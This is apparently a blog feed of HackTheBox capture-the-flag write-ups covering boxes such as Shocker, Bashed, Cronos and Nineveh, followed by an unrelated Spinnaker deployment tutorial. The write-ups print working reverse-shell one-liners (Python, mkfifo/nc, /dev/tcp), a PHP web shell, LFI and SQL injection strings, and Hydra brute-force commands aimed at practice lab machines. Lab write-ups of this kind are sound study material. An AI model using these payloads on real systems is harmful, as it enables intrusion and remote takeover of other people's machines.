Using this password, we can SSH into the box as the user "jjameson".

Let's run "linpeas" script again to check for any PE vectors. The user "jjameson" can run "yum" as a root user.

We can use this from GTFO bins to elevate the user privileges to root.

Lessons Learned

  • Joomla SQLi vulnerability
  • Joomscan to enumerate Joomla

item.title: HTB - Shocker Write Up
item.dc:creator: saikiranchalla
item.content:encoded:
Shocker is an easy level box available on HackTheBox. It is a Linux box with IP 10.10.10.56.

Let's start by scanning the box with NMAP.

There are not many services running on this box. Navigating to http://<IP> in a browser revealed this page.

Sure! I later ran dirbuster with the small directory list and it didn't return anything. So I updated to medium and ran it again. It immediately discovered the following folders.

The directory "cgi-bin" triggers a shellshock vulnerability. Enumerating further for file types like sh, php, pl, and py dirbuster revealed a new endpoint.

Navigating to that endpoint in a Burpsuite browser.

At this point, it is clear that we will use shellshock to exploit the box. To exploit this manually, we will use this (Apache mod_cgi shellshock vulnerability).

python shellshock.py rhost=10.10.10.56 rport=80 lhost=10.10.14.31 lport=4545 payload=reverse pages=/cgi-bin/user.sh

And that will give shell access into the box.

Running sudo -l on the box reveals that the user can run /usr/bin/perl as a root and without password.

We can use this to get a shell as a root user as described here.

Lessons Learned

  • Shellshock

item.title: HTB - Bashed Write Up
item.dc:creator: saikiranchalla
item.content:encoded:
Bashed is an easy-level box on HackTheBox. This is also part of TJ Null's list of boxes for OSCP preparation.

Let's begin by running NMAP.

Looks like only port 80 is open on the box. Navigating to http://<IP> in a browser.

Running dirbuster showed some interesting endpoints.

Opening the "/dev/phpbash.php" in browser revealed a Web Shell.

Enumerate the target box for users.

Let's use the web shell to establish a reverse shell to our attack box.

  • Start a NetCat listener on the attack box.
  • Run `nc <ATTACK_IP> <PORT> on the target box.

This resulted in a connect but was closed immediately.

I looked for another way to establish a reverse shell using one of the binaries described here and found that the box has Python installed on it.

So I used the Python command as below to get a reverse shell.

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",4545));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

And I got the revese shell.

Let's download Linpeas on the box and enumerate it further.

The "www-data" user can run any command as "scriptmanager" user.

Another interesting thing to note in the output is the presense of unexpected folders in the root directory.

The "/scripts" folder is owned by the user "scriptmanager".

Let's get a shell as "scriptmanager" using the command:

sudo -u scriptmanager -i

We can get the user key by using the command below. This is because the key is world readable.

cat /home/arrexel/user.txt

Checking for the "/scripts" folder revealed that the script "test.py" must be running as a "root" user. Moreover, the script must be running every minute based on the timestamp of the "test.txt" file.

Let's create a new script in the "/scripts" folder by download one from the attack box to get reverse shell as root.

item.title: HTB - Nibbles Write Up
item.dc:creator: saikiranchalla
item.content:encoded:
Nibbles is an easy box on Hack The Box. It is also part of TJ Null's list of boxes for OSCP preparation. Although, it's an easy box, I personally think the box doesn't teach much as a learner.

Let's begin by enumerating the box using nmap:

Opening port 80 in a browser revealed this.

But when I looked into the source for this page, I found another endpoint.

The above endpoint hosted a Nibbleblog website.

Running dirbuster with small directory list, revealed an "admin" endpoint.

Note: "/admin" shows directory listing but "/admin.php" shows a login page.

We can try brute-forcing the login credentials using any preferred tool, but this page is protected by a WAF which prevents brute forcing and locks us for sometime.

I tried guessing the credentials (I hate doing this). For sure, the username could be "admin" and with a little Googling, I saw multiple pages with this username.

Password is part that I don't like in this box. It is the name of the box itself, "nibbles".

Logging in with the username "admin" and password "nibbles", we get the admin configuration page.

To get the shell access, we can either use Metasploit or do it manually. Let's do both!

Launch Metasploit and search for Nibbleblog.

Note: To use this module we will need a valid username and password because this exploit only works on authenticated sessions.

Configure the module with the options as shown below.

And running the exploit will give us a meterpreter session.

We can get the user.txt file for the user "nibbler". In addition, there seems to be a Zip file called "personal.zip". Let's get that file into the attack box and enumerate it.

Note: We can use the download command to get the file.

Unzipping the file in our attack box, revealed a shell script.

Running sudo -l on the target box revealed that the user "nibbler" can run monitor.sh as a root user.

Update the "monitor.sh" file in our attack box to launch a shell as root user. Once done, upload the file to the target box at location "/home/nibbler/personal/stuff/monitor.sh".

Uploading the file to the target box using "upload" command in meterpreter.

Second Way...

The second approach is to exploit the vulnerability without using Metasploit. The exploit is well described here. TL;DR We can upload any PHP script in the "My Image" plugin section as an image.

First, let's get a simple PHP script that will help create a reverse shell. Download the script from PenTesterMonkey here.

Update the script to with the attack box IP and any preferred port number.

Upload the script in the "My Image" plugins section by clicking on "Configure".

Note: I tried to upload the file as "php-reverse-shell.php" but that didn't work, so I renamed it to "image.php" and that seemed to have done the magic. I believe dashes are causing the problem.

Start a Netcat listener on a port that was used in the PHP script earlier.

Once uploaded (there might be some warnings. Ignore them!), navigate to http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php.

We should get our shell!

Download the modified "monitor.sh" that we created earlier using wget on the target machine and save it in "/home/nibbler/personal/stuff" directory.

And run the "monitor.sh" as sudo to get root access.

item.title: HTB - Beep Write Up
item.dc:creator: saikiranchalla
item.content:encoded:
Beep is an easy rated machine available on HackTheBox. Let's begin by enumerating the box using nmap.

The box has several ports open which gives us several potential vectors. Let's start by enumerating the port 80. Opening https://<IP> in a browser revealed Elastix.

Elastix is a Linux PBX unified communication system. Let's check Exploit-DB for any vulnerabilities in Elastix. It looks like one version of Elastix does have a LFI vulnerability.

We don't know the version of Elastix yet. Let's enumerate more with "disbuster". Dirbuster showed many directories. Few important ones are as shown:

Navigating to "/admin" showed a login prompt, and I tried several defaults which didn't work. But on the brightside, I got the version of the Elastix running.

Let's check if this version of Elastix is also vulnerable to LFI. Navigating to the URL https://<IP>/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action in a browser revealed the "/etc/passwd" file.

Note: It's better to view the LFI files in a source mode because they are not parsed as HTML and look much better.

Store the user accounts with "/bin/bash" in a text file. We can use these logins for brute forcing later.

Using the original URL specified in the exploit ("/etc/amportal.conf") we can see a configuration file that has some passwords in it. Let's store those passwords in a text file for brute forcing.

In the above file, one of the passwords was repeated several times. So before I tried Hydra, I used the repeated password to SSH as one of the users from the "/etc/passwd" file, and luckily it worked for the root user. :)

Note: SSH didn't work initially because of the error: "ssh unable to negotiate - no matching key exchange method found". I followed the steps here to fix the problem.

Note: Brute forcing using Hydra didn't work because the box has fail2ban Intrusion Prevention System installed on it.

Lessons Learned

  • Elastix Exploit
  • SMTP enumeration (not documented here)
  • Intrusion Prevention System (fail2ban)

item.title: HTB - Cronos Write Up
item.dc:creator: saikiranchalla
item.content:encoded:
Cronos is a medium rated machin on HackTheBox. Let's begin by scanning the box with NMAP.

Let's enumerate the web server using disbuster and medium word list. While that is running, let's enumerate the DNS.

Note: Dirbuster didn't reveal anything except for the "icons" folder.

DNS Enumeration

Let's do a reverse DNS lookup to get more information regarding the domain used (we don't have to guess it).

dig -x 10.10.10.13 @10.10.10.13

So the initial domain name is "cronos.htb". Let's enumerate this further to get other subdomains.

dig axfr @10.10.10.13 cronos.htb

Add "admin.cronos.htb" to "/etc/hosts" and navigate to "admin.cronos.htb" in a browser.

Trying some default credentials like admin:admin, admin:password didn't do the magic. Let's check if the Website is vulnerable to SQLi. Using admin' or '1'='1 as username and password worked.

Looks like its a Website to run "traceroute" and "ping" from a browser. Appending the command "whoami" returned the user "www-data".

Let's use this to get a reverse shell to our attack box. Append the following to the "host" textbox on the website.

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACK_IP> 1234 >/tmp/f

That should give us a reverse shell.

Let's enumerate the box for users by looking into the "/home" directory.

Privilege Escalation

Enumerating the box with "linpeas" output a lot of information but the crontab output stood out.

Artisan is a PHP Laravel framework. From the documentation about scheduling, it looks like "app/Console/Kernel.php" has the scheduled function defined.

Laravel's command scheduler allows you to fluently and expressively define your command schedule within Laravel itself. When using the scheduler, only a single Cron entry is needed on your server. Your task schedule is defined in the app/Console/Kernel.php file's schedule method. To help you get started, a simple example is defined within the method.

Let's modify the file to get bash as a root user.

Note: I tried to get a reverse shell using nc which didn't work. Using "bash -i" as the command to be executed didn't do the magit either.

Wait for a minute and then run "./bash -p" in the "tmp" directory to get a shell as root.

Lessons Learned

  • SQL injection
  • DNS Enumeration

item.title: HTB - Nineveh Write Up
item.dc:creator: saikiranchalla
item.content:encoded:
Nineveh is a medium reted machine on HackTheBox.

Scanning and Enumeration

Let's being by scanning the box with nmap.

The box is running Apache HTTPd on ports 80 and 443. As can be seen from the output above, the name of the ssl cert is nineveh.htb. Add this to /etc/hosts.

Enumerating the above ports with dirbuster revealed several directories.

Navigating to http://10.10.10.43 showed a default page.

And https://10.10.10.43 revealed this:

The box is exposing phpinfo() at http://10.10.10.43/info.php.

Note: Nikto didn't reveal any critical flaws with the webserver and hence I didn't go down that rabbit hole.

http://10.10.10.43/department/login.php showed a login page. Additionally, viewing source revealed a user name "admin".

So clearly, the user name seems to be "admin". The login page also suffers from very specific error messages. That is, when a wrong username is entered, the page says "Invalid Username", and when a wrong password is entered, the error message says "Invalid password".

Using this I was able to crack the "admin" password in Hydra.

hydra -l none -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password" -t 64 -V

Logging in with the username as "admin" and password from Hydra, and clicking around the webpage, I found a LFI vulnerability in "notes" page.

Note: This page requires the input parameter "notes" to contain the text "ninevehNotes", as can be seen from the code below.

Moving to port 443.

Navigating to https://10.10.10.43/db/index.php revealed a phpliteAdmin page.

Using Hydra I was able to crack the password.

hydra -l none -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password" -t 64 -V

Exploitation

So far we have the following:

  • LFI in one of the pages
  • Admin login to PhpLiteAdmin
  • Exposed PHP Info page

1 and 3 in the above are sufficient to gain initial access. But that didn't work for me. So I vultured on the PhpLiteAdmin page.

Searching exploit-db for PhpLiteAdmin exploits revealed this. In summary,

  • Create a database with name ending in .php
  • Create a table with a TEXT field with default value as a PHP script
  • Open the PHP file in a browser.

How do we know the location of the PHP file? Luckily, here renaming a database will reveal the the location is "/var/tmp".

Create a database with name "ninevehNotes.php" (because the LFI expects the name to contain ninevehNotes) and create a table in the DB with name scripts and a single field payload (table name and field names are examples only.)

Default for the field above is:

<?php echo system($.REQUEST["cmd"]); ?>

When we invoke the "ninevehNotes.php" we can pass a query param with name "cmd" for RCE.

Let's switch back to the LFI page and invoke this PHP file using the following URL, but before that start a NetCat listener.

http://10.10.10.43/department/manage.php?notes=/var/tmp/ninevehNotes.php&cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2%3E%261|nc+10.10.14.31+60002+%3E/tmp/f

That should give us a shell!

Enumerating the users folder reveals a user "amrios", but we don't have permission to read the user key.

The secure_notes directory has an image file that consists of the users public and private keys. This can be revealed by running "strings" on the file.

But port 22 is not exposed. There is one hint we can get by reading the mails of the user "amrios".

So the box seems to have knockd installed on it which can be confirmed by looking at /etc/knockd.conf.

So to open the port 22, the sequence is 571,290,911 and the reverse to close it.

To ssh as the user "amrios" use the following command from outside.

Note: Save the public key and the private key of the user from the strings output above and make sure to set the right permissions.

knock 10.10.10.43 571 290 911
ssh -i id_rsa amrios@10.10.10.43

This will give us a shell as the user "amrios".

Privilege Escalation

Download and run linpeas on the box. The output revealed the following interesting things:

The script at "/usr/sbin/report-reset.sh" deletes all the files in the directory /report.

Looking at the content of one of the files, it can be noticed that these files are written by "chkrootkit".

Searching exploit-db for "chkroot" revealed a local PE vulnerability Chkrootkit runs the file "/tmp/update" as a root user.

Since we don't have such file, let's create one with the following content to get the root user's key.

#!/bin/sh
cat /root/root.txt > /home/amrios/root.txt

And after a while, we should get the root key.

Note: I personally like having a shell as the root user to my attack box. If you prefer the same, update the above script to the following.

bash -i >& /dev/tcp/<IP>/8080 0>&1

item.title: HTB - Sense Write Up
item.dc:creator: saikiranchalla
item.content:encoded:
Sense is an easy rated box on HackTheBox. Let's begin by scanning it with nmap.

Scanning and Enumeration

The box has PF Sense Web UI exposed on ports 80 and 443.

The default credentials (admin:pfsense) didn't work. Running gobuster revealed several directories and one of them, /system-users.txt had the username and a hint for the password.

Note: Be sure to use the medium directory list of dirbuster and include txt as well as a file type along with php.

gobuster dir --url https://10.10.10.60 -k -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

Using the credentials from the above file and a default password logged me in. The box is running PF Sense version 2.1.3.

Exploitation

Exploit DB showed a command injection vulnerability. Running the exploit as described returned a reverse shell as root.

item.title: HTB - SolidState Write Up
item.dc:creator: saikiranchalla
item.content:encoded:
SolidState is a medium difficulty machine on HackTheBox.

Scanning and Enumeration

Let's begin by scanning the box with nmap.

NMAP reveals Apache webserver, Apache James POP3 and admin servers, SMTP.

Gobuster directory scan didn't reveal much.

Apache James deployed on the box is version 2.3.2 and has default credentials.

Once logged-in, let's enumerate for users using the "listusers" command.

Exploit

Since we're logged-in as root user on the Apache James server, we can change the password of any user. Let's change the password of all the users to password, so we can connect to port 110 using TELNET and read their E-mails.

User john has an E-mail from James as below.

Let's check Mindy's E-mail because based on the above message John must have sent her new login credentials.

Note: Other users james and thomas, didn't have any E-mails in their Inbox.

Mindy's Email has her login credentials. Let's use these credentials to SSH.

Let's download and run linpeas on the target box.

Searching Exploit DB for Apache James reveals a remote command execution vulnerability and the script is configured to use default credentials.

Download the exploit to the attack box and modify the payload to get a reverse shell.

Before running the exploit, make sure to start netcat listener on port used in the exploit code.

As can be seen from the output, the exploit will be executed only when somebody logs in. To trigger the exploit, SSH as the user mindy

And we should get a reverse shell as the user mindy.

Privilege Escalation

Let's download and run linenum on the target box to check for any PE vectors.

LinEnum revealed a world writable file owned by root user.

Let's edit the file to get a reverse shell to the attack box.

After waiting for a minute, we should get the shell as root.

item.title: HTB - Poison Write Up
item.dc:creator: saikiranchalla
item.content:encoded:
Poison is a medium difficulty machine on HackTheBox. Following skills are tested in this box:

  • Local file inclusion

Let's begin by enumerating the box using NMAP.

Scanning and Enumeration

The box is running a HTTP webserver. Navigating to the URL http://10.10.10.84 in a browser shows that the box is hosting a website to test PHP files.

From that statement, it is that the webserver must be vulnerable to Local File Inclusion (LFI) vulnerability.

Intercepting the request in BurpSuite and testing for LFI, reveals that the box is vulnerable.

Looking at the /etc/passwd file, it can be noticed that box is running on Freebsd. Let's modify the User-Agent header in the request to insert a PHP script that can help execute commands on the box.

Exploitation

Modifying the User-Agent field as described above will write the output to /var/log/http-access.log and the PHP script can be invoked by exploiting the LFI vulnerability.

Once the request is successful, navigate to the URL http://10.10.10.84/browse.php?file=../../../../var/log/httpd-access.log&cmd=id to confirm that the PHP script is in place.

Before proceeding any further, start a NetCat listener on preferred port. Change the cmd query parameter above to nc -e /bin/sh <ATTACK_IP> <PORT>, to get a reverse shell to the attack box.

item.title: Spinnaker
item.dc:creator: saikiranchalla
item.content:encoded:
Introduction

I recently had an opportunity to learn a Continuous Delivery tool from Netflix called Spinnaker. Unlike other tools which rely on a lot of dependent tools to configure cloud environment to deploy an application, Spinnaker is a one-stop solution to deploy services to multiple cloud providers.

Using Spinnaker, we can deploy a service to AWS (EC2, Lambda), Azure, GCP and any Kubernetes cluster. Here, I want to introduce you to Spinnaker in an easy way that'll help you deploy a NodeJS app to Amazon EKS

Installing Spinnaker

We will install Spinnaker on an AWS EC2 instance.

First start by launching an Amazon EC2 machine:

  1. AMI: use Ubuntu Linux 18.04
  2. Storage: 100 Gb
  3. Size: t2.large
  4. Security Group
    • Inbound Rules: Allow port 9000, 8084 and 22

Next, SSH into the newly create VM to install Halyard.

Execute the following script to create a user, add swapspace and install Halyard.

#!/bin/bash
# Install User script
groupadd ubuntu
useradd -g ubuntu -G admin -s /bin/bash -d /home/ubuntu ubuntu
mkdir -p /home/ubuntu
cp -r /root/.ssh /home/ubuntu/.ssh
chown -R ubuntu:ubuntu /home/ubuntu
echo "ubuntu	ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers

The following script will add Swap Space

#!/bin/bash

sudo fallocate -l 8G /swapfile
sudo chmod 600 /swapfile
sudo mkswap /swapfile
echo '/swapfile none swap sw 0 0' | sudo tee -a /etc/fstab
sudo swapon /swapfile

Next step is to install Halyard

#!/bin/bash

set -e

sudo add-apt-repository ppa:openjdk-r/ppa -y

sudo apt-get update
sudo apt-get -y install jq openjdk-11-jdk

curl -O https://raw.githubusercontent.com/spinnaker/halyard/master/install/debian/InstallHalyard.sh
sudo bash InstallHalyard.sh --user ubuntu
curl -fsSL get.docker.com -o get-docker.sh
sh get-docker.sh
sudo usermod -aG docker ubuntu
sudo docker run -p 127.0.0.1:9090:9000 -d --name minio1 -v /mnt/data:/data -v /mnt/config:/root/.minio minio/minio server /data

sudo apt-get -y install jq apt-transport-https

MINIO_SECRET_KEY="minioadmin"
MINIO_ACCESS_KEY="minioadmin"

echo $MINIO_SECRET_KEY | hal config storage s3 edit --endpoint http://127.0.0.1:9090 \
    --access-key-id $MINIO_ACCESS_KEY \
    --secret-access-key

hal config storage edit --type s3

Once Halyard is installed, we can continue to deploy Spinnaker. But before we deploy Spinnaker, we have to setup authentication. For this demo, we will use Github OAuth to enable Authentication.

Create a new Github OAuth App by following this URL. Homepage URL and Authorization callback URL will the http://<SPINNAKER IP>:8084/login.

Make a note of the client ID and generate a new client secret. We will need these in the next step.

Use the following script to enable authentication.

#!/bin/bash

# env flags that need to be set:
MY_IP=`curl -s ifconfig.co`
CLIENT_ID=myClientId
CLIENT_SECRET=myClientSecret
PROVIDER=github
REDIRECT_URI=http://${MY_IP}:8084/login

set -e

if [ -z "${CLIENT_ID}" ] ; then
  echo "CLIENT_ID not set"
  exit
fi
if [ -z "${CLIENT_SECRET}" ] ; then
  echo "CLIENT_SECRET not set"
  exit
fi
if [ -z "${PROVIDER}" ] ; then
  echo "PROVIDER not set"
  exit
fi
if [ -z "${REDIRECT_URI}" ] ; then
  echo "REDIRECT_URI not set"
  exit
fi

hal config security authn oauth2 edit \
  --client-id $CLIENT_ID \
  --client-secret $CLIENT_SECRET \
  --provider $PROVIDER
hal config security authn oauth2 enable

hal config security authn oauth2 edit --pre-established-redirect-uri $REDIRECT_URI

hal config security ui edit \
    --override-base-url http://${MY_IP}:9000

hal config security api edit \
    --override-base-url http://${MY_IP}:8084
DO NOT forget to update the client ID and client secret in the above script.

Once you run the above script, we can deploy Spinnaker. Use the following script to deploy Spinnaker.

#!/bin/bash

# install dependencies
sudo apt update
sudo apt-get -y install redis-server
sudo systemctl enable redis-server
sudo systemctl start redis-server

echo 'spinnaker.s3:
  versioning: false
' > ~/.hal/default/profiles/front50-local.yml

# env flag that need to be set:
SPINNAKER_VERSION=1.26.3

set -e

if [ -z "${SPINNAKER_VERSION}" ] ; then
  echo "SPINNAKER_VERSION not set"
  exit
fi

sudo hal config version edit --version $SPINNAKER_VERSION

sudo hal deploy apply

At the time of this writing, the version of Spinnaker was 1.26.3.

Following are the services that Spinnaker consists along with their port numbers:

Check the logs using journalctl. This is one default that I'm not a fan of. Logs should be written to a log file in my opinion. And Spinnaker does create log files for all the services in /var/log/spinnaker but nothing is written to them.

We can change this by modifying the service file to add the following.

sudo vi /lib/systemd/system/{name}.service
[Service]
...
StandardOutput=file:/var/log/spinnaker/{name}/logs.log
StandardError=file:/var/log/spinnaker/{name}/logs.log

Now that Spinnaker is deployed, navigate to http://<IP>:9000 and authenticate using Github.

This completes the installation of Spinnaker. Next step is to deploy an EKS cluster.

Deploying EKS Cluster

For this step, we will use AWS CLI and EKSCTL to create the cluster.

First step is to install and configure Kubectl. Use the following script for this:

# Download and install kubectl
`curl -LO https://storage.googleapis.com/kubernetes-release/release/$(curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt)/bin/linux/amd64/kubectl
chmod +x ./kubectl
sudo mv ./kubectl /usr/local/bin/kubectl
# Verify the installation of kubectl
kubectl help

Next step is to install and configure AWS CLI and EKSCTL.

# Install the awscli
sudo apt install python-pip awscli

# Verify the installation
aws --version

# Configure AWS CLI
aws configure --profile default

# Download and configure eksctl
curl --silent --location "https://github.com/weaveworks/eksctl/releases/download/latest_release/eksctl_$(uname -s)_amd64.tar.gz" | tar xz -C /tmp

sudo mv /tmp/eksctl /usr/local/bin

# Verify the installation
eksctl help

Now we're ready to create an EKS cluster on AWS.

eksctl create cluster --name=eks-spinnaker --nodes=2 --region=us-east-1 --write-kubeconfig=false --zones=us-east-1a, us-east-1b

This will create a 2 node cluster in the US-EAST-1 region.

Once the cluster is deployed and ready, read the cluster configs using the following command:

aws eks update-kubeconfig --name eks-spinnaker --region us-east-1 --alias eks-spinnaker

This will create the config in K8s default directory, ~/.kube/config.

Last step is to update Halyard configuration to use the K8s context from above and create a service account for Spinnaker to perform deployments.

# Enable the Kubernetes provider
hal config provider kubernetes enable

# Set the current kubectl context to the cluster for Spinnaker
kubectl config use-context eks-spinnaker

# Assign the Kubernetes context to CONTEXT
CONTEXT=$(kubectl config current-context)

# Next, create a service account for the Amazon EKS cluster:

kubectl apply --context $CONTEXT -f https://www.spinnaker.io/downloads/kubernetes/service-account.yml

# Extract the secret token of the spinnaker-service-account:

TOKEN=$(kubectl get secret --context $CONTEXT \
   $(kubectl get serviceaccount spinnaker-service-account \
       --context $CONTEXT \
       -n spinnaker \
       -o jsonpath='{.secrets[0].name}') \
   -n spinnaker \
   -o jsonpath='{.data.token}' | base64 --decode)

# Set the user entry in kubeconfig:

kubectl config set-credentials ${CONTEXT}-token-user --token $TOKEN

kubectl config set-context $CONTEXT --user ${CONTEXT}-token-user

# Add eks-spinnaker cluster as a Kubernetes provider:

hal config provider kubernetes account add eks-spinnaker --context $CONTEXT --provider-version v2

After this step, run the spinnaker deploy script again to apply the changes.

With this, we have completed setting up our Spinnaker to deploy a service to Kubernetes cluster.

Pipeline Configuration

Next step is to configure a pipeline to perform the deployment. For this we will use a NodeJS demo app here. To keep it simple, we will provide the Kubernetes manifest as text when configuring the pipeline using the contents from the file demo-app.yml.

Use the following steps to create the pipeline:

  1. Create an application called demo-app.
  2. Click on the "Pipelines" tab on the left and configure a pipeline.
  3. Add a stage called "Deploy (Manifest)". In the Kubernetes provider V2, we can use manifest files to deploy applications to K8s.
  4. For the artifact, select "Text" and paste the contents from "demo-app.yml".
  5. Save and run the pipeline.
